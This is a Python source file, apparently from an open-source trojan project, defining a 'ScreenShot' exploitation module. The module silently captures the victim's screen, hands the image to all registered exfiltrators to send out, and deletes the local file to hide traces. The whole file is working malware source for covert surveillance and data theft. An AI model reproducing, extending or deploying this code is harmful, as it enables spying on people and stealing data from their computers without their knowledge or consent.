#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

import os
from pathlib import Path

from mss import mss

from src.modules.exploitation.base import ExploitationModule


class ScreenShot(ExploitationModule):
    def __init__(self, image_path: [str, Path]):
        super().__init__()
        self._image_path = Path(image_path)

    @property
    def contents(self) -> Path:
        return self._image_path

    @property
    def has_data(self) -> bool:
        return self._image_path.is_file()

    def report(self):
        raise NotImplementedError

    def _notify_all_exfiltrators(self) -> None:
        [exfiltrator.update(self.contents) for exfiltrator in
         self._exfiltrators]

    def execute(self):
        """Take a screenshot, send it as a file to all registered
        exfiltrators and remove it."""
        with mss() as screen:
            screen.shot(output=str(self._image_path))
        self._notify_all_exfiltrators()
        os.unlink(self._image_path)
